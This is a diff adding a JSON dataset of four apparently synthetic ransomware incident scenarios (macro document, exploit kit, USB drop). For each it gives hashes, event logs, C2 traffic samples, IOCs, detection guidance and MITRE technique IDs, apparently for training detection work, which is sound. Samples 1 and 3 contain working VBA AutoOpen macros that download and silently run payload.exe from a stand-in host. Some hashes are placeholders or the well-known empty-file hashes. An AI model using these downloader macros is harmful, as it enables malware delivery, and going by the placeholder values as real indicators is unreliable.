@@ -1,0 +1,347 @@
+{
+  "samples": [
+    {
+      "scenario": "Ransomware as a Service Infection via Malicious Macro in Office Document Leading to Credential Theft and Endpoint Encryption",
+      "technical_data": {
+        "file_hashes": {
+          "malicious_doc": {
+            "md5": "a5b9c8d7e6f4a3b2c1d0e9f8a7b6c5d4",
+            "sha1": "1f2e3d4c5b6a79808796a5b4c3d2e1f0a9b8c7d6",
+            "sha256": "c23f5a7b8e9d1f0a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a"
+          },
+          "ransomware_payload": {
+            "md5": "b7e8d9c1a2f3e4d5c6b7a8f9e0d1c2b3",
+            "sha1": "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b",
+            "sha256": "f1e2d3c4b5a697887766554433221100ffeeddccbbaa99887766554433221100"
+          }
+        },
+        "vba_macro_code": "Sub AutoOpen()\r\n Dim strUrl As String\r\n strUrl = \"http://evilserver[.]net/payload.exe\"\r\n Dim strPath As String\r\n strPath = Environ(\"TEMP\") & \"\\payload.exe\"\r\n Dim WinHttpReq As Object\r\n Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\r\n WinHttpReq.Open \"GET\", strUrl, False\r\n WinHttpReq.Send\r\n If WinHttpReq.Status = 200 Then\r\n  Dim oStream As Object\r\n  Set oStream = CreateObject(\"ADODB.Stream\")\r\n  oStream.Open\r\n  oStream.Type = 1\r\n  oStream.Write WinHttpReq.responseBody\r\n  oStream.SaveToFile strPath, 2\r\n  oStream.Close\r\n  Shell strPath, vbHide\r\n End If\r\nEnd Sub",
+        "registry_changes": [
+          {
+            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate",
+            "type": "REG_SZ",
+            "data": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          }
+        ],
+        "process_tree": [
+          {
+            "parent_process": "winword.exe",
+            "child_process": "payload.exe",
+            "command_line": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          }
+        ],
+        "c2_traffic_sample": "POST /checkin HTTP/1.1\r\nHost: evilserver.net\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 70\r\n\r\n{\"machine_id\":\"host5678\",\"status\":\"infected\",\"data\":\"credentials_dumped\"}",
+        "memory_dump_snippet": "Process: payload.exe\nModules:\n  ntdll.dll\n  kernel32.dll\n  user32.dll\n  advapi32.dll\nStrings found:\n  CryptAcquireContext\n  LsaStorePrivateData\n  DumpCreds\n  ransom_note.txt\n  .locked\n\n",
+        "event_logs": [
+          {
+            "timestamp": "2024-06-14T09:45:12.789Z",
+            "event_id": 4688,
+            "message": "A new process has been created: New Process Name: C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe Command Line: \"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\" Parent Process Name: winword.exe"
+          },
+          {
+            "timestamp": "2024-06-14T09:45:30.112Z",
+            "event_id": 4663,
+            "message": "Access to file C:\\Users\\user\\Documents\\ImportantData.docx was denied."
+          }
+        ],
+        "backup_logs": [
+          {
+            "timestamp": "2024-06-13T23:00:00.000Z",
+            "backup_status": "success",
+            "target": "network_backup_share",
+            "notes": "Backup verified clean prior to infection event"
+          }
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "evilserver.net"
+        ],
+        "ioc_files": [
+          "payload.exe",
+          "ransom_note.txt"
+        ],
+        "ioc_registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate"
+        ],
+        "ioc_process_names": [
+          "payload.exe",
+          "winword.exe (with suspicious child process)"
+        ],
+        "ioc_network_patterns": [
+          "POST /checkin to evilserver.net with credentials data"
+        ]
+      },
+      "detection_method": "Detect execution of Office macros with network activity downloading executables from rare external domains. Monitor creation of processes spawned by winword.exe that run payloads from TEMP directories. Detect registry autorun keys with suspicious names like 'SysUpdate' pointing to TEMP executables. Analyze network traffic for POST requests containing JSON payloads with machine IDs and credential theft indicators. Correlate event ID 4688 for new process creation with elevated privileges and suspicious parent-child relationships. Monitor file access denial events indicating encryption or file locking.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1059.003",
+        "T1486",
+        "T1110",
+        "T1547.001",
+        "T1005"
+      ]
+    },
+    {
+      "scenario": "Ransomware as a Service Infection via Exploit Kit Delivered Through Compromised Website Leading to Endpoint Encryption and Lateral Movement",
+      "technical_data": {
+        "file_hashes": {
+          "exploit_kit_loader": {
+            "md5": "f3e4d5c6b7a8f9e0d1c2b3a4c5d6e7f8",
+            "sha1": "0a1b2c3d4e5f6789abcdef0123456789abcdef01",
+            "sha256": "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
+          },
+          "ransomware_payload": {
+            "md5": "11223344556677889900aabbccddeeff",
+            "sha1": "99887766554433221100ffeeddccbbaa99887766",
+            "sha256": "ffeeddccbbaa99887766554433221100aabbccddeeff99887766554433221100"
+          }
+        },
+        "exploit_kit_script": "<script>var xhr = new XMLHttpRequest(); xhr.open('GET','http://compromisedsite[.]com/exploit.js',true); xhr.send();</script>",
+        "registry_changes": [
+          {
+            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc",
+            "type": "REG_SZ",
+            "data": "\"C:\\Windows\\Temp\\msupdate.exe\""
+          }
+        ],
+        "process_tree": [
+          {
+            "parent_process": "iexplore.exe",
+            "child_process": "msupdate.exe",
+            "command_line": "\"C:\\Windows\\Temp\\msupdate.exe\""
+          }
+        ],
+        "c2_traffic_sample": "GET /cmd?id=host9999 HTTP/1.1\r\nHost: c2.evilcorp[.]net\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
+        "memory_dump_snippet": "Process: msupdate.exe\nModules:\n  ntdll.dll\n  kernelbase.dll\n  wininet.dll\n  ws2_32.dll\nStrings found:\n  ConnectToC2\n  EncryptFiles\n  LateralMovement\n  ransom_instructions.txt\n  .lockeddata\n\n",
+        "event_logs": [
+          {
+            "timestamp": "2024-06-15T16:33:22.456Z",
+            "event_id": 4688,
+            "message": "A new process has been created: New Process Name: C:\\Windows\\Temp\\msupdate.exe Command Line: \"C:\\Windows\\Temp\\msupdate.exe\" Parent Process Name: iexplore.exe"
+          },
+          {
+            "timestamp": "2024-06-15T16:34:10.789Z",
+            "event_id": 5140,
+            "message": "A network share was accessed: \\\\192.168.1.25\\shared_docs by user DOMAIN\\victim"
+          }
+        ],
+        "backup_logs": [
+          {
+            "timestamp": "2024-06-14T22:00:00.000Z",
+            "backup_status": "success",
+            "target": "cloud_backup_storage",
+            "notes": "Offline backup before exploit kit infection"
+          }
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "compromisedsite.com",
+          "c2.evilcorp.net"
+        ],
+        "ioc_files": [
+          "msupdate.exe",
+          "ransom_instructions.txt"
+        ],
+        "ioc_registry_keys": [
+          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc"
+        ],
+        "ioc_process_names": [
+          "msupdate.exe",
+          "iexplore.exe (with suspicious child process)"
+        ],
+        "ioc_network_patterns": [
+          "GET /cmd?id=host9999 to c2.evilcorp.net"
+        ]
+      },
+      "detection_method": "Monitor web browsers for execution of scripts from compromised domains consistent with exploit kits. Detect processes spawned by browsers executing unknown binaries from Temp or Windows directories. Identify registry autorun keys with suspicious service names like 'UpdateSvc' pointing to Temp binaries. Inspect network traffic for beaconing GET requests to known C2 domains with specific query parameters. Correlate event ID 4688 with process creation from browsers and subsequent lateral movement detected via network share access events (event ID 5140). Verify backup integrity and enforce offline or immutable backup solutions.",
+      "relevant_mitre_techniques": [
+        "T1203",
+        "T1059.004",
+        "T1071.001",
+        "T1486",
+        "T1570",
+        "T1021.001"
+      ]
+    },
+    {
+      "scenario": "Ransomware as a Service Infection via Malicious Macro-Enabled Document Leading to Endpoint Encryption and Persistence via Scheduled Task",
+      "technical_data": {
+        "file_hashes": {
+          "dropper_doc": {
+            "md5": "a7f5f35426b927411fc9231b56382173",
+            "sha1": "c8fed00eb2e87f1cee8e90ebbe870c190ac3848c",
+            "sha256": "3a7bd3e2360a3d8be9ef7b8d13d4d0f8f7b7a3c4e1a7e7d1b9e7f9a1b2c3d4e5"
+          },
+          "ransomware_payload": {
+            "md5": "4b825dc642cb6eb9a060e54bf8d69288",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        },
+        "vba_macro_code": "Sub AutoOpen()\n Dim http As Object\n Set http = CreateObject(\"MSXML2.XMLHTTP\")\n http.Open \"GET\", \"http://evilserver[.]net/payload.exe\", False\n http.Send\n If http.Status = 200 Then\n  Dim stream As Object\n  Set stream = CreateObject(\"ADODB.Stream\")\n  stream.Open\n  stream.Type = 1\n  stream.Write http.responseBody\n  stream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\n  stream.Close\n  Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\n End If\nEnd Sub",
+        "scheduled_task": {
+          "name": "UpdaterCheck",
+          "action": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\"",
+          "trigger": "At log on"
+        },
+        "registry_changes": [
+          {
+            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\UpdaterCheck",
+            "type": "REG_SZ",
+            "data": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          }
+        ],
+        "process_tree": [
+          {
+            "parent_process": "winword.exe",
+            "child_process": "cmd.exe",
+            "command_line": "cmd /c start C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe"
+          },
+          {
+            "parent_process": "cmd.exe",
+            "child_process": "payload.exe",
+            "command_line": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          }
+        ],
+        "c2_traffic_sample": "GET /checkin HTTP/1.1\r\nHost: evilserver.net\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+        "memory_dump_snippet": "Process: payload.exe\nModules:\n  ntdll.dll\n  kernelbase.dll\n  ws2_32.dll\n  crypt32.dll\nStrings found:\n  EncryptData\n  ScheduleTask\n  ransom_instructions.txt\n  .locked\n",
+        "event_logs": [
+          {
+            "timestamp": "2024-06-14T09:15:30.344Z",
+            "event_id": 4688,
+            "message": "A new process has been created: New Process Name: C:\\Windows\\System32\\cmd.exe Command Line: cmd /c start C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe Parent Process Name: winword.exe"
+          },
+          {
+            "timestamp": "2024-06-14T09:15:50.678Z",
+            "event_id": 4698,
+            "message": "A scheduled task was created: Task Name: \\UpdaterCheck, Action: \"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          }
+        ],
+        "backup_logs": [
+          {
+            "timestamp": "2024-06-13T23:00:00.000Z",
+            "backup_status": "success",
+            "target": "network_backup_share",
+            "notes": "Backup before infection, verified integrity"
+          }
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "evilserver.net"
+        ],
+        "ioc_files": [
+          "payload.exe",
+          "ransom_instructions.txt"
+        ],
+        "ioc_registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\UpdaterCheck"
+        ],
+        "ioc_process_names": [
+          "payload.exe",
+          "cmd.exe (spawned by winword.exe)"
+        ],
+        "ioc_network_patterns": [
+          "GET /checkin to evilserver.net"
+        ]
+      },
+      "detection_method": "Detect execution of macro-enabled documents spawning cmd to launch executables from TEMP directory. Monitor creation of scheduled tasks with suspicious names like 'UpdaterCheck' pointing to TEMP folder executables. Correlate process creation events involving winword.exe spawning cmd.exe and subsequent payload.exe execution. Network monitoring for HTTP GET requests to known malicious servers such as evilserver.net. Analyze event logs for task creation event ID 4698 and process creation event ID 4688 with matching suspicious command lines. Verify backup availability before infection and isolate affected hosts.",
+      "relevant_mitre_techniques": [
+        "T1204.002",
+        "T1059.003",
+        "T1053.005",
+        "T1486",
+        "T1105",
+        "T1112"
+      ]
+    },
+    {
+      "scenario": "Ransomware as a Service Infection via Malicious USB Drop Leading to Endpoint Encryption and Persistence via WMI Event Subscription",
+      "technical_data": {
+        "file_hashes": {
+          "usb_dropper": {
+            "md5": "5d41402abc4b2a76b9719d911017c592",
+            "sha1": "7d793037a0760186574b0282f2f435e7e68e7a7a",
+            "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+          },
+          "ransomware_payload": {
+            "md5": "3c59dc048e8850243be8079a5c74d079",
+            "sha1": "2e7d2c03a9507ae265ecf5b5356885a53393a0a6",
+            "sha256": "6b86b273ff34fce19d6b804eff5a3f5740e1b63d3f1f0f6d9e7a6e8c9b0f5e7b"
+          }
+        },
+        "usb_autorun_inf": "[AutoRun]\nopen=payload.exe\nicon=payload.ico",
+        "wmi_event_subscription": {
+          "name": "UpdaterListener",
+          "query": "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType = 2",
+          "action": "\"C:\\Windows\\Temp\\payload.exe\""
+        },
+        "registry_changes": [
+          {
+            "path": "HKLM\\Software\\Microsoft\\Wbem\\CIMOM\\Filters\\{12345678-90AB-CDEF-1234-567890ABCDEF}",
+            "type": "REG_SZ",
+            "data": "UpdaterListener"
+          }
+        ],
+        "process_tree": [
+          {
+            "parent_process": "explorer.exe",
+            "child_process": "payload.exe",
+            "command_line": "\"C:\\Windows\\Temp\\payload.exe\""
+          }
+        ],
+        "c2_traffic_sample": "POST /api/command HTTP/1.1\r\nHost: c2dropper.attackersite.net\r\nUser-Agent: curl/7.68.0\r\nContent-Type: application/json\r\nContent-Length: 72\r\n\r\n{\"host\":\"infected_host\",\"cmd\":\"encrypt\",\"status\":\"initiated\",\"key\":\"def456uvw\"}",
+        "memory_dump_snippet": "Process: payload.exe\nModules:\n  ntdll.dll\n  kernel32.dll\n  ole32.dll\n  advapi32.dll\nStrings found:\n  WMIEvent\n  EncryptPayload\n  ransom_message.txt\n  .locked_files\n",
+        "event_logs": [
+          {
+            "timestamp": "2024-06-15T16:40:12.789Z",
+            "event_id": 4697,
+            "message": "A service was installed in the system: Service Name: UpdaterListener, Display Name: UpdaterListener"
+          },
+          {
+            "timestamp": "2024-06-15T16:42:01.234Z",
+            "event_id": 4688,
+            "message": "A new process has been created: New Process Name: C:\\Windows\\Temp\\payload.exe Command Line: \"C:\\Windows\\Temp\\payload.exe\" Parent Process Name: explorer.exe"
+          }
+        ],
+        "backup_logs": [
+          {
+            "timestamp": "2024-06-14T20:00:00.000Z",
+            "backup_status": "success",
+            "target": "cloud_backup_service",
+            "notes": "Validated backup prior to incident"
+          }
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "c2dropper.attackersite.net"
+        ],
+        "ioc_files": [
+          "payload.exe",
+          "ransom_message.txt"
+        ],
+        "ioc_registry_keys": [
+          "HKLM\\Software\\Microsoft\\Wbem\\CIMOM\\Filters\\{12345678-90AB-CDEF-1234-567890ABCDEF}"
+        ],
+        "ioc_process_names": [
+          "payload.exe"
+        ],
+        "ioc_network_patterns": [
+          "POST /api/command to c2dropper.attackersite.net"
+        ]
+      },
+      "detection_method": "Detect execution of payload.exe from unusual locations such as C:\\Windows\\Temp initiated by explorer.exe. Monitor WMI event subscriptions that trigger payload execution on USB drive insertion events, indicated by filter names like UpdaterListener. Correlate event ID 4697 for service installation with suspicious names and event ID 4688 for process creation of payload.exe. Network monitoring for POST requests with JSON commands to known C2 domains such as c2dropper.attackersite.net. Analyze autorun.inf files on removable drives for malicious payload execution commands. Ensure backup systems are isolated and verify backup integrity before infection.",
+      "relevant_mitre_techniques": [
+        "T1204.002",
+        "T1547.001",
+        "T1486",
+        "T1105",
+        "T1055",
+        "T1112"
+      ]
+    }
+  ]
+}
